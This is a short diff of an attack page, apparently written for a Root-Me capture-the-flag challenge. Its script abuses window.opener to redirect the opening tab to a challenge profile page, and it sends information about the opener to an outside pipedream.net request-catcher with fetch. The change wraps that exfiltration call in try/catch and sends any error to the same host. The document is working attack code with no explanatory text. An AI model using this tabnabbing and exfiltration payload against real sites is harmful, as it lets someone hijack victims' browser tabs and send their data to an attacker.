@@ -5,7 +5,11 @@
 <script>
 window.opener.location.replace("http://challenge01.root-me.org:58003/profile");
 
-fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + window.opener, {mode: 'no-cors'})
+try{
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + window.opener, {mode: 'no-cors'})
+} catch (error) {
+  	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr='+error, {mode: 'no-cors'})
+}
 </script>
 <!--
 <script>
